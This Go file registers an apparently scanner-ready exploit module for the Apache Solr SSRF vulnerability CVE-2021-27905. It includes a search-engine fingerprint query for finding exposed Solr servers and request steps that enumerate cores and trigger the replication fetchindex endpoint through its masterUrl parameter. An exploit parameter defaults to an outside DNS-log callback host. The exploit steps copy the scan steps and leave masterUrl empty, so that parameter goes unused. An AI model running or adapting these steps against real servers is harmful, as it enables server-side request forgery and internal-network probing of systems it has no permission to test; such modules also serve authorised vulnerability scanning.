package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Apache Solr SSRF (CVE-2021-27905)",
    "Description": "Apache Solr has an SSRF vulnerability, which can be verified by changing the value of the MASTERURL parameter, such as DNSlog.\\nAffected version: Apache Solr ",
    "Impact": "Apache Solr SSRF (CVE-2021-27905)",
    "Recommendation": "<p>1. Upgrade to Apache Solr latest version 8.8.2 now:<a href=\"https://solr.apache.org/downloads.html\">https://solr.apache.org/downloads.html</a></p><p>2. Set up a web application firewall for protection . </p><p>3. If not necessary, please prohibit public network access. </p>",
    "Product": "APACHE-Solr",
    "VulType": [
        "Server-Side Request Forgery"
    ],
    "Tags": [
        "Server-Side Request Forgery"
    ],
    "Translation": {
        "CN": {
            "Name": "APACHE-Solr存在SSRF漏洞(CVE-2021-27905)",
            "Description": "Apache Lucene项目的开源企业搜索（英语：Enterprise search）平台。其主要功能包括全文检索、命中标示[1]、分面搜索（英语：Faceted search）、动态聚类、数据库集成，以及富文本（如Word、PDF）的处理。",
            "Impact": "<p>Apache Lucene项目的开源企业搜索（英语：Enterprise search）平台。其主要功能包括全文检索、命中标示[1]、分面搜索（英语：Faceted search）、动态聚类、数据库集成，以及富文本（如Word、PDF）的处理。</p><p>APACHE-Solr系统存在SSRF漏洞，攻击者可以通过该漏洞探测内网信息。<br><br></p>",
            "Recommendation": "<p>1、<span style=\"color: rgb(51, 51, 51); font-size: 16px;\">立即升级到 Apache Solr 最新版本8.8.2：</span><a href=\"https://solr.apache.org/downloads.html\">https://solr.apache.org/downloads.html</a></p><p>2、设置web应用防火墙进行防护。</p><p>3、如非必要，请禁止公网访问。</p>",
            "Product": "APACHE-Solr",
            "VulType": [
                "服务器端请求伪造"
            ],
            "Tags": [
                "服务器端请求伪造"
            ]
        },
        "EN": {
            "Name": "Apache Solr SSRF (CVE-2021-27905)",
            "Description": "Apache Solr has an SSRF vulnerability, which can be verified by changing the value of the MASTERURL parameter, such as DNSlog.\\nAffected version: Apache Solr < 8.8.2",
            "Impact": "Apache Solr SSRF (CVE-2021-27905)",
            "Recommendation": "<p>1. <span style=\"color: rgb(51, 51, 51); font-size: 16px;\">Upgrade to Apache Solr latest version 8.8.2 now:</span><a href= \"https://solr.apache.org/downloads.html\">https://solr.apache.org/downloads.html</a></p><p>2. Set up a web application firewall for protection . </p><p>3. If not necessary, please prohibit public network access. </p>",
            "Product": "APACHE-Solr",
            "VulType": [
                "Server-Side Request Forgery"
            ],
            "Tags": [
                "Server-Side Request Forgery"
            ]
        }
    },
    "FofaQuery": "(title=\"Solr Admin\" || body=\"SolrCore Initialization Failures\" || body=\"app_config.solr_path\" || (banner=\"/solr/\" && banner=\"Location\" && banner!=\"couchdb\" && banner!=\"drupal\"))",
    "GobyQuery": "(title=\"Solr Admin\" || body=\"SolrCore Initialization Failures\" || body=\"app_config.solr_path\" || (banner=\"/solr/\" && banner=\"Location\" && banner!=\"couchdb\" && banner!=\"drupal\"))",
    "Author": "gobysec@gmail.com",
    "Homepage": "https://solr.apache.org/",
    "DisclosureDate": "2021-06-03",
    "References": [
        "https://www.seebug.org/vuldb/ssvid-99264"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "1",
    "CVSS": "5.6",
    "CVEIDs": [
        "CVE-2021-27905"
    ],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/solr/admin/cores?indexInfo=false&wt=json",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "responseHeader",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(?s)\"name\":\"(.*?)\","
            ]
        },
        {
            "Request": {
                "method": "GET",
                "set_variable": [
                    "solrCore|lastbody|regex|(?s)\"name\":\"(.*?)\","
                ],
                "uri": "/solr/{{{solrCore}}}/replication/?command=fetchindex&masterUrl=",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "OK",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/solr/admin/cores?indexInfo=false&wt=json",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "responseHeader",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(?s)\"name\":\"(.*?)\","
            ]
        },
        {
            "Request": {
                "method": "GET",
                "set_variable": [
                    "solrCore|lastbody|regex|(?s)\"name\":\"(.*?)\","
                ],
                "uri": "/solr/{{{solrCore}}}/replication/?command=fetchindex&masterUrl=",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "OK",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "Url",
            "type": "input",
            "value": "http://dnslog.cn",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10475"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
